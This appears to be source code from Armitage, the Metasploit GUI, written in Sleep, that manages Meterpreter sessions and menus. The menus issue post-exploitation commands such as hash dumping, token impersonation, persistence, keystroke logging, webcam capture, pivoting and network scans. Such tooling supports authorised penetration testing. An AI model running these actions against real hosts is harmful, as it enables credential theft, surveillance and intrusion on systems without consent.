
#
# this code maintains the client threads (one per meterpreter session) and
# the data structures for each meterpreter session.
#

import armitage.*;
import console.*;
import msf.*;

import javax.swing.*;

global('%sessions %handlers $handler');

sub session {
	if ($1 !in %sessions && $mclient !is $null) {
		%sessions[$1] = [new MeterpreterSession: $mclient, $1];
		[%sessions[$1] addListener: lambda(&parseMeterpreter)];		
	}

	return %sessions[$1];
}

sub oneTimeShow {
	%handlers[$1] = lambda({
		if ($0 eq "begin") {
			showError($2);
			%handlers[$command] = $null;
		}
	}, $command => $1);
}

# m_cmd("session", "command here")
sub m_cmd {
	if ($mclient is $null) {
		warn("Dropping: " . @_ . " - collab check not complete!");
		return;
	}

	local('$command $handler');
        $command = split('\s+', [$2 trim])[0];
	$handler = %handlers[$command];

	if ($handler !is $null) {
		[$handler execute: $1, [$2 trim]];
	}
	else {
		$handler = {};
	}

	[session($1) addCommand: $handler, "$2 $+ \n"];
}

sub parseMeterpreter {
	local('@temp $command $line $sid $token $response $data $command');

	# called with: sid, token, response 
	($sid, $token, $response) = @_;

	if ($token isa ^MeterpreterClient) {
		return;
	}

	$response = convertAll($3);
	$data = $response['data'];

	if ("*uploaded*:*->*" iswm $data) {
		# this is a hack to force the file browser to refresh when a file is uploaded
		m_cmd($sid, "ls");
	}
	else if ("[-]*Unknown command: *list_tokens*" iswm $data) {
		warn("Uhm... still an unknown command?!?");
		m_cmd($sid, "use incognito");
		return; 
	}
	else if ("[-]*Unknown command: *" iswm $data) {
		%handlers["list_tokens"] = $null;
		%handlers["getuid"] = $null;
		m_cmd($sid, "use stdapi");
		m_cmd($sid, "use priv");
		showError("Loading stdapi. Try command again");
		return;
	}

	$handler = $token;

	if ($handler !is $null && $0 eq "commandComplete") {
		local('$h');
		$h = $handler;
		[$h begin: $1, $data];
		@temp = split("\n", $data);
		foreach $line (@temp) {
			[$h update: $1, $line];
		}	
		[$h end: $1, $data];
	}
	else if ($handler !is $null && $0 eq "commandTimeout") {
		[$handler timeout: $1, $data];
	}
}

#
# this code creates and managers a meterpreter tab.
#
sub createMeterpreterTab {
        local('$session $result $thread $console $old');

        $session = session($1);

	# set up a meterpreter console window
        $console = [new Console: $preferences];
	logCheck($console, sessionToHost($1), "meterpreter_ $+ $1");
	[$console setPopupMenu: lambda(&meterpreterPopup, $session => sessionData($1), $sid => $1)];

	# tab completion for Meterpreter... :D
	[new TabCompletion: $console, $client, $1, "session.meterpreter_tabs"];

	# set up a listener to read input from the console and dump output back to it.
	if ("*Windows*" !iswm sessionToOS($1) || ($REMOTE && $mclient is $client)) {
		[new MeterpreterClient: $console, $session, $null];
	}
	else {
		[new MeterpreterClient: $console, $session, newInstance(^java.awt.event.ActionListener, lambda({ createShellTab($sid); }, $sid => $1))];
	}

        [$frame addTab: "Meterpreter $1", $console, $null];
}

sub meterpreterPopup {
        local('$popup');
        $popup = [new JPopupMenu];

	showMeterpreterMenu($popup, \$session, \$sid);
	
        [$popup show: [$2 getSource], [$2 getX], [$2 getY]];
}

sub showMeterpreterMenu {
	local('$j $platform');
	
	$platform = lc($session['platform']);

	if ("*win*" iswm $platform) {
		$j = menu($1, "Access", 'A');
	
		item($j, "Migrate Now!", 'M', lambda({
			oneTimeShow("run");
			m_cmd($sid, "run migrate -f");
		}, $sid => "$sid"));

		item($j, "Escalate Privileges", 'E', lambda({
			showPostModules($sid, "*escalate*");
		}, $sid => "$sid"));

		item($j, "Steal Token", "S", lambda({
			%handlers["list_tokens"] = lambda({
				$watch['value'] += 1;

				if ($0 eq "update" && '\\' isin $2) {
					%tokens[$2] = %(Token => $2, Type => $type);
				}
				else if ($0 eq "update") {
					if ("Delegation" isin $2) {
						$type = "Delegation";
					}
					else if ("Impersonation" isin $2) {
						$type = "Impersonation";
					}
				}
				else if ($0 eq "end" && $show is $null) {
					$show = 1;
					thread(lambda({
						# keep going and wait for watch value to stay at 0 for 3.5s
						while ($watch['value'] > 0) {
							$watch['value'] = 0;
							yield 3500;
						}

						# ok, now we can display the tokens...
						quickListDialog("Steal Token $sid", "Impersonate", @("Token", "Token", "Type"), values(%tokens), $width => 480, $height => 240, lambda({
							oneTimeShow("impersonate_token");
							m_cmd($sid, "impersonate_token ' $+ $1 $+ '");
						}, \$sid));
					}, \$sid, \%tokens, \$watch));
				}
			}, \$sid, %tokens => ohash(), $show => $null, $watch => %(value => 1), $type => "");

			%handlers["use"] = lambda({
				if ($0 eq "end" && "*incognito*" iswm $2) {
					m_cmd($sid, "list_tokens -u");
					m_cmd($sid, "list_tokens -g");
				}
			}, \$sid);

			m_cmd($sid, "use incognito");
		}, $sid => "$sid"));

		local('$h');
		$h = menu($j, "Dump Hashes", "D");

		item($h, "lsass method", "l", lambda({
			m_cmd($sid, "hashdump");
		}, $sid => "$sid"));


		item($h, "registry method", "r", lambda({
			thread(lambda({
				launch_dialog("Dump Hashes", "post", "windows/gather/smart_hashdump", 1, $null, %(SESSION => $sid, GETSYSTEM => "1"));
			}, \$sid));
		}, $sid => "$sid"));

		item($j, "Persist", 'P', lambda({
			cmd_safe("setg LPORT", lambda({
				if ([$3 trim] ismatch 'LPORT .. (\d+).*') {
					launch_dialog("Persistence", "post", "windows/manage/persistence", 1, $null, %(SESSION => $sid, LPORT => matched()[0], HANDLER => "0"));
				}
			}, \$sid));
		}, $sid => "$sid"));

		item($j, "Pass Session", 'S', lambda({
			cmd_safe("setg LPORT", lambda({
				if ([$3 trim] ismatch 'LPORT .. (\d+).*') {
					launch_dialog("Pass Session", "post", "windows/manage/payload_inject", 1, $null, %(SESSION => $sid, LPORT => matched()[0], HANDLER => "0"));
				}
			}, \$sid));
		}, $sid => "$sid"));
	}
			
	$j = menu($1, "Interact", 'I');

			if ("*win*" iswm $platform && (!$REMOTE || $mclient !is $client)) {
				item($j, "Command Shell", 'C', lambda({ createShellTab($sid); }, $sid => "$sid"));
			}

			item($j, "Meterpreter Shell", 'M', lambda({ createMeterpreterTab($sid); }, $sid => "$sid"));

			if ("*win*" iswm $platform) {
				item($j, "Desktop (VNC)", 'D', lambda({ 
					local('$display');
					$display = rand(9) . rand(9);
					%handlers["run"] = lambda({
						if ($0 eq "begin") {
							local('$a');
							$a = iff($REMOTE, $MY_ADDRESS, "127.0.0.1");
							showError("$2 $+ \nConnect VNC viewer to $a $+ :59 $+ $display (display $display $+ )\n\nIf your connection is refused, you may need to migrate to a \nnew process to set up VNC.");
							%handlers["run"] = $null;
						}
					}, \$display);

					if ($REMOTE) {
						m_cmd($sid, "run vnc -V -t -O -v 59 $+ $display -p " . randomPort() . " -i");
					}
					else {
						m_cmd($sid, "run vnc -V -t -v 59 $+ $display -p " . randomPort() . " -i");
					}
				}, $sid => "$sid"));
			}

	$j = menu($1, "Explore", 'E');
			item($j, "Browse Files", 'B', lambda({ createFileBrowser($sid, $platform); }, $sid => "$sid", \$platform));
			item($j, "Show Processes", 'P', lambda({ createProcessBrowser($sid); }, $sid => "$sid"));
			if ("*win*" iswm $platform) {
				item($j, "Log Keystrokes", 'K', lambda({ 
					launch_dialog("Log Keystrokes", "post", "windows/capture/keylog_recorder", 1, $null, %(SESSION => $sid, MIGRATE => 1, ShowKeystrokes => 1));
				}, $sid => "$sid"));
			}

			if (!$REMOTE || $mclient !is $client) {
				item($j, "Screenshot", 'S', createScreenshotViewer("$sid"));
				item($j, "Webcam Shot", 'W', createWebcamViewer("$sid"));
			}

			separator($j);

			item($j, "Post Modules", 'M', lambda({ showPostModules($sid); }, $sid => "$sid"));

	$j = menu($1, "Pivoting", 'P');
			item($j, "Setup...", 'A', setupPivotDialog("$sid"));
			item($j, "Remove", 'R', lambda({ killPivots($sid, $session); }, \$session, $sid => "$sid"));

	if ("*win*" iswm $platform) {
		item($1, "ARP Scan...", 'A', setupArpScanDialog("$sid"));
	}

	separator($1);

	item($1, "Kill", 'K', lambda({ cmd_safe("sessions -k $sid"); }, $sid => "$sid"));
}

sub launch_msf_scans {
	local('@modules $1 $hosts');

	@modules = filter({ return iff("*_version" iswm $1, $1); }, @auxiliary);
	push(@modules, "scanner/discovery/udp_sweep");
	push(@modules, "scanner/netbios/nbname");
	push(@modules, "scanner/dcerpc/tcp_dcerpc_auditor");
	push(@modules, "scanner/mssql/mssql_ping");

	$hosts = iff($1 is $null, ask("Enter range (e.g., 192.168.1.0/24):"), $1);

	thread(lambda({
		local('%options $scanner $count $pivot $index $progress');

		if ($hosts !is $null) {
		        $progress = [new javax.swing.ProgressMonitor: $null, "Launch Scans", "", 0, size(@modules)];

			# we don't need to set CHOST as the discovery modules will honor any pivots already in place
			%options = %(THREADS => iff(isWindows(), 1, 8), RHOSTS => $hosts);

			foreach $index => $scanner (@modules) {
				[$progress setProgress: $index];
				[$progress setNote: $scanner];

				if ($scanner eq "scanner/http/http_version") {
					local('%o2');
					%o2 = copy(%options);
					%o2["RPORT"] = "443";
					%o2["SSL"] = "1";
					call($client, "module.execute", "auxiliary", $scanner, %o2);
				}
				call($client, "module.execute", "auxiliary", $scanner, %options);
				$count++;
				yield 250;
			}

			elog("launched $count discovery modules at: $hosts");
			[$progress close];
		}
	}, \$hosts, \@modules));
}
